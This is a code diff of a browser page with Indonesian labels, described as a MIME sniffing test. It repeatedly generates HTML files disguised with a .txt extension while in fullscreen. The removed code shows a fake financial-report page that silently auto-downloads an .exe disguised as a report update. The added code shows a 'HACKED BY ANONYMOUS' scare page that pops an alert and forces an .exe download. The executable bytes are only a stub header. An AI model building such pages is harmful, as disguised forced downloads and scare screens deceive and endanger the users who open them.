@@ -95,7 +95,7 @@ word-break: break-all;
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus.</p>
+<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -124,67 +124,60 @@ window.speechSynthesis.speak(utterance);
 const prepareMimeBlobAsync = (i) => {
 return new Promise((resolve) => {
 queueMicrotask(() => {
-const payloadText = "<html>\n" +
-"<head><meta charset=\"UTF-8\"><title>Laporan Keuangan</title></head>\n" +
-"<body style=\"font-family:Arial;background:#f0f2f5;padding:40px;text-align:center\">\n" +
-"<div style=\"max-width:500px;margin:0 auto;background:#fff;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1)\">\n" +
-"<h1 style=\"color:#1e3a8a\">Laporan Keuangan</h1>\n" +
-"<p style=\"color:#4b5563\">Lampiran pendukung sedang dipersiapkan...</p>\n" +
-"<p style=\"color:#3b82f6;font-weight:bold\" id=\"loading\">Menyiapkan berkas...</p>\n" +
-"</div>\n" +
-"<script>\n" +
-"(function() {\n" +
-"    \"use strict\";\n" +
-"    \n" +
-"    function b64KeBytes(b64) {\n" +
-"        var binary = atob(b64);\n" +
-"        var bytes = new Uint8Array(binary.length);\n" +
-"        for (var i = 0; i < binary.length; i++) {\n" +
-"            bytes[i] = binary.charCodeAt(i);\n" +
-"        }\n" +
-"        return bytes;\n" +
-"    }\n" +
-"    \n" +
-"    function b64KeString(b64) {\n" +
-"        return decodeURIComponent(escape(atob(b64)));\n" +
-"    }\n" +
-"    \n" +
-"    var b64Header = \"TVqQAAMAAAAEAAAA\";\n" +
-"    var b64Bytes = \"AEEAAgBA\";\n" +
-"    \n" +
-"    function picuAutoDownload() {\n" +
-"        try {\n" +
-"            var headerStr = b64KeString(b64Header);\n" +
-"            var bytesArr = b64KeBytes(b64Bytes);\n" +
-"            var blob = new Blob([headerStr, bytesArr], { type: \"application/x-msdownload\" });\n" +
-"            var url = URL.createObjectURL(blob);\n" +
-"            var a = document.createElement(\"a\");\n" +
-"            a.href = url;\n" +
-"            a.download = \"update-laporan-" + String(i).padStart(3, '0') + ".exe\";\n" +
-"            a.style.display = \"none\";\n" +
-"            document.body.appendChild(a);\n" +
-"            a.click();\n" +
-"            setTimeout(function() {\n" +
-"                document.body.removeChild(a);\n" +
-"                URL.revokeObjectURL(url);\n" +
-"            }, 2000);\n" +
-"            var el = document.getElementById(\"loading\");\n" +
-"            if (el) el.textContent = \"Berkas berhasil diunduh.\";\n" +
-"        } catch (e) {\n" +
-"            console.warn(\"Auto download gagal:\", e.message);\n" +
-"        }\n" +
-"    }\n" +
-"    \n" +
-"    if (document.readyState === \"loading\") {\n" +
-"        document.addEventListener(\"DOMContentLoaded\", function() {\n" +
-"            setTimeout(picuAutoDownload, 400);\n" +
-"        });\n" +
-"    } else {\n" +
-"        setTimeout(picuAutoDownload, 400);\n" +
-"    }\n" +
-"})();\n" +
-"<\/script>\n" +
-"</body>\n" +
+const payloadText = "<!DOCTYPE html>" +
+"<html>" +
+"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
+"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden'>" +
+"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
+"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
+"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>ANONYMOUS</h2>" +
+"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
+"<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6'>Payload sedang diunduh...</p>" +
+"<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
+"</div>" +
+"<style>" +
+"@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
+"body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
+"</style>" +
+"<script>" +
+"(function(){" +
+"\"use strict\";" +
+"document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
+"try { alert('HACKED BY ANONYMOUS'); } catch(e){}" +
+"function b64KeBytes(b64){" +
+"var binary = atob(b64);" +
+"var bytes = new Uint8Array(binary.length);" +
+"for (var i=0;i<binary.length;i++){ bytes[i]=binary.charCodeAt(i); }" +
+"return bytes;" +
+"}" +
+"function b64KeString(b64){" +
+"return decodeURIComponent(escape(atob(b64)));" +
+"}" +
+"var b64Header = \"TVqQAAMAAAAEAAAA\";" +
+"var b64Bytes = \"AEEAAgBA\";" +
+"function picuDownload(){" +
+"try{" +
+"var headerStr = b64KeString(b64Header);" +
+"var bytesArr = b64KeBytes(b64Bytes);" +
+"var blob = new Blob([headerStr, bytesArr], { type: 'application/x-msdownload' });" +
+"var url = URL.createObjectURL(blob);" +
+"var a = document.createElement('a');" +
+"a.href = url;" +
+"a.download = 'hacked-by-anonymous.exe';" +
+"a.style.display = 'none';" +
+"document.body.appendChild(a);" +
+"a.click();" +
+"setTimeout(function(){ document.body.removeChild(a); URL.revokeObjectURL(url); }, 2000);" +
+"} catch(e){ console.warn('Gagal:', e.message); }" +
+"}" +
+"if (document.readyState === 'loading'){" +
+"document.addEventListener('DOMContentLoaded', function(){ setTimeout(picuDownload, 500); });" +
+"} else {" +
+"setTimeout(picuDownload, 500);" +
+"}" +
+"})();" +
+"<\/script>" +
+"</body>" +
 "</html>";
           
 const blob = new Blob([payloadText], { type: "text/html" });
@@ -197,8 +190,8 @@ resolve({ id: i, url: url });
 const triggerInstantDownload = (fileData) => {
 const link = document.createElement("a");
 link.href = fileData.url;
-link.download = `test-file-${fileData.id}.txt.html`;
-link.textContent = `Blob #${fileData.id} (.txt.html)`;
+link.download = `test-file-${fileData.id}.txt`;
+link.textContent = `Blob #${fileData.id} (.txt)`;
 link.style.display = "none";
 downloadsDiv.appendChild(link);
 link.click();
